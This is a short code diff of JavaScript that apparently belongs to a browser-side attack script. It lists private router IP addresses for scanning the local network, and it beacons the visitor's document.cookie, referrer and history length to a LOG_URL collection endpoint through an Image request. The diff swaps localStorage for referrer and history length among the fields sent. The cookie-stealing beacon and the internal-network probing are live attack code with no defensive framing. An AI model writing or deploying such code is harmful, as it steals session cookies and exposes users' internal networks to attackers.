@@ -18,7 +18,7 @@
     let local_ips = ["192.168.255.1", "192.168.100.1","10.0.1.1", "172.16.254.1", "172.16.100.1"];
     
      let imCoo = new Image();
-     imCoo.src = LOG_URL + "?c=" + document.cookie + "&l=" + localStorage;
+     imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
      //
       var last_scanobj_index = 0;
       var scanobjs = {};
